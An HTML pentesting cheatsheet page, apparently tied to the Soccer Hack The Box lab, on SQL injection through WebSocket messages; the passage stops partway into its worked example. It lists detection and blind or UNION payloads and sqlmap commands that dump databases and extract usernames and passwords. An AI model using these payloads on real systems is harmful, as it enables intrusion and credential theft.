+<article class="post-single cheatsheet-page">
+  <header class="post-header">
+    <div class="breadcrumbs">
+      <a href="/">Home</a> &nbsp;/&nbsp; <a href="/cheatsheets/">Cheatsheets</a> &nbsp;/&nbsp; WebSocket SQL Injection Cheatsheet
+    </div>
+    <h1 class="post-title">
+      WebSocket SQL Injection Cheatsheet
+    </h1>
+    <div class="post-description">
+      Specialized techniques for testing and exploiting SQL injection vulnerabilities in WebSocket connections
+    </div>
+    <div class="post-meta">
+      <span title='January 1, 2024'>
+        January 1, 2024
+      </span>
+      <span class="post-tags">
+        <a href="/tags/websocket">#websocket</a>
+        <a href="/tags/sql-injection">#sql-injection</a>
+        <a href="/tags/web-security">#web-security</a>
+        <a href="/tags/pentesting">#pentesting</a>
+      </span>
+    </div>
+  </header>
+
+  <div class="post-content"><h1 id="websocket-sql-injection-cheatsheet">WebSocket SQL Injection Cheatsheet</h1>
+<h2 id="websocket-basics">WebSocket Basics</h2>
+<h3 id="websocket-connection">WebSocket Connection</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// Basic WebSocket connection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="s2">&#34;ws://target.com:9091&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// With specific endpoint
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="s2">&#34;ws://soc-player.soccer.htb:9091&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Secure WebSocket
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">wss</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="s2">&#34;wss://target.com:443/ws&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><h3 id="websocket-message-format">WebSocket Message Format</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// JSON message format
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;id&#34;</span><span class="o">:</span> <span class="s2">&#34;value_to_test&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Simple string message
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;test_value&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Complex JSON structure
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;action&#34;</span><span class="o">:</span> <span class="s2">&#34;query&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;data&#34;</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;id&#34;</span><span class="o">:</span> <span class="s2">&#34;vulnerable_parameter&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}))</span>
+</span></span></code></pre></div><hr>
+<h2 id="testing-websocket-connections">Testing WebSocket Connections</h2>
+<h3 id="manual-browser-testing">Manual Browser Testing</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// Open browser console and connect
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="s2">&#34;ws://soc-player.soccer.htb:9091&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">ws</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Connected to WebSocket&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Received:&#39;</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Send test payloads
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="s2">&#34;id&#34;</span><span class="o">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}))</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="s2">&#34;id&#34;</span><span class="o">:</span> <span class="s2">&#34;1&#39;&#34;</span><span class="p">}))</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="s2">&#34;id&#34;</span><span class="o">:</span> <span class="s2">&#34;1&#39; OR &#39;1&#39;=&#39;1&#34;</span><span class="p">}))</span>
+</span></span></code></pre></div><h3 id="using-wscat">Using wscat</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Install wscat</span>
+</span></span><span class="line"><span class="cl">npm install -g wscat
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Connect to WebSocket</span>
+</span></span><span class="line"><span class="cl">wscat -c ws://soc-player.soccer.htb:9091
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Send JSON payloads</span>
+</span></span><span class="line"><span class="cl">&gt; <span class="o">{</span><span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;1&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl">&gt; <span class="o">{</span><span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;1&#39;&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl">&gt; <span class="o">{</span><span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;1 OR 1=1&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl">&gt; <span class="o">{</span><span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;92130 or 5=1-- -&#34;</span><span class="o">}</span>
+</span></span></code></pre></div><hr>
+<h2 id="sql-injection-detection">SQL Injection Detection</h2>
+<h3 id="basic-detection-payloads">Basic Detection Payloads</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// Test for errors with single quote
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Test for boolean conditions
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1 AND 1=1&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1 AND 1=2&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Test for time delays
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1 AND SLEEP(5)&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39;; WAITFOR DELAY &#39;0:0:5&#39;--&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Test for union-based injection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1 UNION SELECT 1,2,3&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><h3 id="error-based-detection">Error-Based Detection</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// MySQL error triggers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39;&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1\&#34;&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1`&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// SQL Server error triggers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39;&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1]&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// PostgreSQL error triggers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39;&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1$&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><h3 id="boolean-based-detection">Boolean-Based Detection</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// True condition
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;92130 or 5=5-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// False condition  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;92130 or 5=6-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// String comparison
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; OR &#39;a&#39;=&#39;a&#39;-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; OR &#39;a&#39;=&#39;b&#39;-- -&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><hr>
+<h2 id="sqlmap-with-websockets">sqlmap with WebSockets</h2>
+<h3 id="basic-sqlmap-usage">Basic sqlmap Usage</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Test WebSocket with JSON payload</span>
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;ws://soc-player.soccer.htb:9091/&#39;</span> --data <span class="s1">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> --batch
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># With specific risk and level</span>
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;ws://soc-player.soccer.htb:9091/&#39;</span> --data <span class="s1">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> --level <span class="m">5</span> --risk <span class="m">3</span> --batch
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Enable threading for faster execution</span>
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;ws://soc-player.soccer.htb:9091/&#39;</span> --data <span class="s1">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> --level <span class="m">5</span> --risk <span class="m">3</span> --batch --threads <span class="m">10</span>
+</span></span></code></pre></div><h3 id="database-enumeration">Database Enumeration</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Enumerate databases</span>
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;ws://soc-player.soccer.htb:9091/&#39;</span> --data <span class="s1">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> --dbs --batch
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Enumerate tables in specific database</span>
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;ws://soc-player.soccer.htb:9091/&#39;</span> --data <span class="s1">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> -D soccer_db --tables --batch
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Dump specific table</span>
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;ws://soc-player.soccer.htb:9091/&#39;</span> --data <span class="s1">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> -D soccer_db -T accounts --dump --batch
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Dump all data from database</span>
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;ws://soc-player.soccer.htb:9091/&#39;</span> --data <span class="s1">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> -D soccer_db --dump --batch
+</span></span></code></pre></div><h3 id="advanced-sqlmap-options">Advanced sqlmap Options</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Force specific DBMS</span>
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;ws://target:9091/&#39;</span> --data <span class="s1">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> --dbms<span class="o">=</span>mysql --batch
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Custom tamper scripts</span>
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;ws://target:9091/&#39;</span> --data <span class="s1">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> --tamper<span class="o">=</span>space2comment --batch
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Specify injection technique</span>
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;ws://target:9091/&#39;</span> --data <span class="s1">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> --technique<span class="o">=</span>BT --batch
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Save session</span>
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;ws://target:9091/&#39;</span> --data <span class="s1">&#39;{&#34;id&#34;:&#34;*&#34;}&#39;</span> --batch --session-file<span class="o">=</span>session.db
+</span></span></code></pre></div><hr>
+<h2 id="manual-exploitation-techniques">Manual Exploitation Techniques</h2>
+<h3 id="boolean-based-blind-injection">Boolean-Based Blind Injection</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// Check for MySQL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; AND (SELECT COUNT(*) FROM information_schema.tables) &gt; 0-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Extract database name length
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; AND LENGTH(database()) = 9-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Extract database name character by character
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; AND SUBSTRING(database(),1,1) = &#39;s&#39;-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; AND SUBSTRING(database(),2,1) = &#39;o&#39;-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Extract table names
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = 1-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = &#39;accounts&#39;-- -&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><h3 id="time-based-blind-injection">Time-Based Blind Injection</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// MySQL time delays
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; AND SLEEP(5)-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; AND IF(LENGTH(database())=9,SLEEP(5),0)-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// SQL Server time delays
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39;; WAITFOR DELAY &#39;0:0:5&#39;-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39;; IF (LEN(DB_NAME())=9) WAITFOR DELAY &#39;0:0:5&#39;-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// PostgreSQL time delays
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; AND (SELECT 1 FROM pg_sleep(5))-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Conditional time delays
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; AND (CASE WHEN (SUBSTRING(user(),1,1)=&#39;r&#39;) THEN SLEEP(5) ELSE 0 END)-- -&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><h3 id="union-based-injection">Union-Based Injection</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// Determine number of columns
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; ORDER BY 1-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; ORDER BY 2-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; ORDER BY 3-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Test for UNION compatibility
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; UNION SELECT NULL-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; UNION SELECT NULL,NULL-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Extract database information
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; UNION SELECT @@version,user()-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; UNION SELECT database(),NULL-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Extract table data
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; UNION SELECT table_name,NULL FROM information_schema.tables-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; UNION SELECT username,password FROM accounts-- -&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><hr>
+<h2 id="websocket-specific-payloads">WebSocket-Specific Payloads</h2>
+<h3 id="json-context-injection">JSON Context Injection</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// Basic JSON structure
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; OR &#39;1&#39;=&#39;1&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Nested JSON injection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;user_data&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; UNION SELECT password FROM users-- -&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Array-based injection
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;ids&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#39; OR &#39;1&#39;=&#39;1-- -&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="message-format-variations">Message Format Variations</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// Different parameter names
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;user_id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; OR 1=1-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;session_id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; OR 1=1-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; OR 1=1-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Multiple parameters
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;user&#39; OR 1=1-- -&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Base64 encoded payloads
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;MSBPUiAxPTEtLSAt&#34;</span><span class="p">}</span>  <span class="c1">// 1 OR 1=1-- -
+</span></span></span></code></pre></div><hr>
+<h2 id="real-world-example-soccer-htb">Real-World Example: Soccer HTB</h2>
+<h3 id="connection-setup">Connection Setup</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// Target WebSocket from Soccer HTB
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="s2">&#34;ws://soc-player.soccer.htb:9091&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">ws</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Connected to soccer WebSocket&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Response:&#39;</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="testing-process">Testing Process</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// 1. Test basic functionality
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="s2">&#34;id&#34;</span><span class="o">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 2. Test for SQL injection
